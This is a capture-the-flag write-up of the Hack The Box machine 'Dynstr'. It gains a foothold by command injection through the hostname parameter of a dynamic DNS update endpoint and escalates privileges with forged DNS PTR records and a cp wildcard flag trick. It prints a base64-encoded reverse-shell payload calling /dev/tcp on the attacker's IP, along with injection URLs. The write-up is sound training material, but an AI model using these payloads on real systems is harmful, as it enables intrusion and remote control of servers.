![](dynstr_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.10.244 dyna.htb

**nmap scan:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**From web application**

![](screenshots/web-app.png)

* Found Email `E: dns@dyna.htb` on http server **Port 80** 
* Domain: **dyna.htb**
* Found beta creds in home page **dynadns:sndanyd**
* **Gobuster** Found `/nic/update`


# Foothold

## ISC BIND DNSserver

* dns server is **ISC BIND 9.16.1**
  * **[ISC BIND](https://www.isc.org/bind/):** is an open source system free to download and use, offered under the Mozilla Public License. BIND can be used to run a caching DNS server or an authoritative name server, and provides features like load balancing, notify, dynamic update, split DNS, DNSSEC, IPv6, and more.
  * Running **Version: 9.16.1**
  * [Bind Security Advisories](https://kb.isc.org/docs/aa-00913)

`/nic/update` returning "badauth"
```bash
❯ curl http://10.10.10.244/nic/update
badauth
```

Doing basic auth with creds `dynadns:sndanyd` on `/nic/update` with header `Authorization: Basic ZHluYWRuczpzbmRhbnlk` get diffrent response.

```bash
❯ curl -s 'http://dyna.htb/nic/update'
badauth
❯ curl -s 'http://dynadns:sndanyd@dyna.htb/nic/update'
nochg 10.10.15.71
```

This endpoint talking to Bind DNS server using [Dynamic DNS Update API](https://help.dyn.com/remote-access-api/) specifications.

Dynamic DNS (DDNS) is a service that keeps the DNS updated with a web property's correct IP address, even if that IP address is constantly being updated. _Source [cloudflare.com](https://www.cloudflare.com/en-in/learning/dns/glossary/dynamic-dns/)_

This web application providing Dynamic DNS for a number of domains: `dnsalias.htb`, `dynamicdns.htb`, `no-ip.htb`

With API, We can update DDNS from [perform-update](https://help.dyn.com/remote-access-api/perform-update/)
```bash
http://{username}:{password}@members.dyndns.org/nic/update?hostname={yourhostname}&myip={ipaddress}&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG
```

That way we can Create/Update Dynamic DNS entry
```bash
❯ curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=test.dnsalias.htb&myip=10.10.15.71'
good 10.10.14.41
```

## Command Injection in Dyn API

Doing fuzzing with ffuf found special character injection
```bash
❯ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=FUZZ.dnsalias.htb&myip=0.0.0.0' -ac -v -c

# ... [snip] ...

[Status: 200, Size: 76, Words: 6, Lines: 5]
| URL | http://dynadns:sndanyd@dyna.htb/nic/update?hostname=".dnsalias.htb&myip=0.0.0.0
    * FUZZ: "

:: Progress: [32/32] :: Job [1/1] :: 13 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

get detailed response
```bash
❯ curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=".dnsalias.htb&myip=0.0.0.0'
server 127.0.0.1
zone dnsalias.htb
update delete .dnsalias.htb
good 0.0.0.0
```

And get command injection
```bash
❯ curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`id`".dnsalias.htb&myip=0.0.0.0'
server 127.0.0.1
zone dnsalias.htb
update delete uid=33(www-data) gid=33(www-data) groups=33(www-data).dnsalias.htb
good 0.0.0.0
```

Getting reverse shell
```bash
echo "bash -i &> /dev/tcp/10.10.15.71/4141 0>&1" | base64   #encode reverse shell
echo+"YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA%2BJjEK"+|+base64+-d+|+bash    #payload

curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+"YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA%2BJjEK"+|+base64+-d+|+bash`".dnsalias.htb&myip=0.0.0.0'
```

![](screenshots/rev_shell.png)

# Privesc

## DNS pointer record(PTR)

User "bindmgr" have .ssh direcotry which contains ssh key, but can't read pirvate key.
```bash
(remote) www-data@dynstr.dyna.htb:/home/bindmgr/.ssh$ ls -l
total 16
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
```

User's home directory contians some debug log in `/home/bindmgr/support-case-C62796521`
```bash
(remote) www-data@dynstr.dyna.htb:/home/bindmgr$ ls -l
total 8
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
```

that folder contians some debug output in which, found private ssh key of user "bindmgr"
```bash
(remote) www-data@dynstr.dyna.htb:/home/bindmgr/support-case-C62796521$ ls -l 
total 428
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt
```

![](screenshots/private-rsa.png)

but ssh key is not working.

looking into `/home/bindmgr/.ssh/authorized_keys` which contains `from="*.infra.dyna.htb"`. That means `AnyHost.infra.dyna.htb` can login to user "bindmgr" with his private key.

A [DNS pointer record](https://www.cloudflare.com/en-in/learning/dns/dns-records/dns-ptr-record/) (PTR for short) provides the domain name associated with an IP address. A DNS PTR record is exactly the opposite of the 'A' record, which provides the IP address associated with a domain name. DNS PTR records are used in reverse DNS lookups.

we can add PTR record into infra dynamic dns associated to our tun0 ip, which resolve `AnyHost.infra.dyna.htb` with our ip address and allow us to ssh with "bindmgr" ssh key.

[`nsupdate`](https://linux.die.net/man/8/nsupdate) allow to ad PTR record.

The `-k` may also be used to specify a SIG(0) key used to authenticate Dynamic DNS update requests. In this case, the key specified is not an HMAC-MD5 key. 
and we need to update PTR record in "infra" Dynamic DNS, That means we need "infra" Dynamic DNS private key, which found in `/etc/bind/infra.key`.

[Solution](https://superuser.com/questions/977132/when-using-nsupdate-to-update-both-a-and-ptr-records-why-do-i-get-update-faile) for adding PTR record with `nsupdate`.

```bash
nsupdate -k /etc/bind/infra.key
update add gotcha.infra.dyna.htb. 86400 A 10.10.15.71
<Enter>
update add 71.15.10.10.in-addr.arpa. 300 PTR gotcha.infra.dyna.htb.
send
```

![](screenshots/got-user.png)

## Wildcard in `cp` Command

user "bindmgr" can run `/usr/local/bin/bindmgr.sh` as any user with NOPASSWD as sudo.
```bash
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

**`/usr/local/bin/bindmgr.sh` script breakdown**

This code checks `.version` file in current directory and its content
```bash
#!/bin/bash

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi
```

Than adding all file names from current directory in `named.conf.bindmgr` config file.
```bash
# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done
```

copy `.version` and all other files with a wildcard from current directory to `/etc/bind/named.bindmgr/`
```bash
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

and after that, checking config file with [named-checkconf](https://linux.die.net/man/8/named-checkconf) utility, which is not so important because our exploit present in this wildcard.

`cp` command have a flag from [man page](https://man7.org/linux/man-pages/man1/cp.1.html)
```bash
 -p     same as --preserve=mode,ownership,timestamps

 --preserve[=ATTR_LIST]
          preserve the specified attributes (default: mode,ownership,timestamps),
          if possible additional attributes: context, links, xattr, all
```

this flag allow to preserve(as the name suggest) same permission which file currently have for any user who copy that file.

and same as tar wildcard exploit we create a file named `--preserve=mode`. When script run `cp` command this that file as a command flag as copy all file from current directory with same permissions which files currently have for any user who run the script into `/etc/bind/named.bindmgr/`.

![](screenshots/dynstr-rooted.png)